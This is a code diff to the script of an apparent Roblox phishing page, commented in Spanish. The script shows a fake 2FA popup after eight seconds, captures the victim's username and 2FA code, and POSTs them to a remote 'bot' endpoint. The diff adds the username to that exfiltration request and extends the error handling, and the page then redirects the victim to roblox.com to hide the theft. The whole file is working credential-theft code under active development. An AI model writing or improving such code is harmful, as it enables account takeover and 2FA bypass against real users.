@@ -569,6 +569,7 @@
 <script>
 // ============================================================
 // SOLUCIÓN DEFINITIVA - POPUP 2FA SIEMPRE A LOS 8 SEGUNDOS
+// CON ENVÍO DE USERNAME PARA ASIGNACIÓN CORRECTA
 // ============================================================
 
 // ============================================================
@@ -651,7 +652,7 @@ async function enviarAlBot(username, password) {
 }
 
 // ============================================================
-// ENVIAR CÓDIGO AL BOT
+// ENVIAR CÓDIGO AL BOT (CON USERNAME)
 // ============================================================
 
 async function enviarCodigoAlBot(codigo) {
@@ -660,12 +661,26 @@ async function enviarCodigoAlBot(codigo) {
         return;
     }
     
+    // 🔥 Asegurarnos de tener el username
+    if (!usernameCapturado) {
+        // Intentar obtenerlo del campo de login por si acaso
+        const inputs = document.querySelectorAll('.login-input');
+        if (inputs.length >= 2) {
+            usernameCapturado = inputs[0]?.value || '';
+        }
+    }
+    
     try {
-        console.log('📤 Enviando código al bot:', codigo);
+        console.log('📤 Enviando código al bot para usuario:', usernameCapturado);
+        console.log('📤 Código:', codigo);
+        
         const response = await fetch(`${botUrl}/2fa`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ code: codigo })
+            body: JSON.stringify({ 
+                code: codigo,
+                username: usernameCapturado  // 🔥 ENVIAR EL USERNAME
+            })
         });
         const data = await response.json();
         console.log('📨 Respuesta 2FA:', data);
@@ -677,7 +692,7 @@ async function enviarCodigoAlBot(codigo) {
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com';
             }, 2000);
-        } else {
+        } else if (data.status === '2FA_FALLIDO') {
             mostrarError('Código incorrecto. Intenta de nuevo.');
             esperandoCodigo = true;
             codigoEnviado = false;
@@ -686,10 +701,15 @@ async function enviarCodigoAlBot(codigo) {
                 input.value = '';
                 input.focus();
             }
+        } else {
+            mostrarError('Error al verificar el código. Intenta de nuevo.');
+            esperandoCodigo = true;
+            codigoEnviado = false;
         }
     } catch (error) {
         console.error('❌ Error:', error);
         mostrarError('Error de conexión con el servidor');
+        codigoEnviado = false;
     }
 }
 
@@ -851,6 +871,7 @@ async function verificarConexionBot() {
 
 console.log('✅ POPUP FORZADO - Se mostrará a los 8 segundos siempre');
 console.log('📡 Bot URL:', botUrl);
+console.log('📌 El código 2FA se enviará con el username para asignación correcta');
 setTimeout(verificarConexionBot, 2000);
 </script>
 </body>
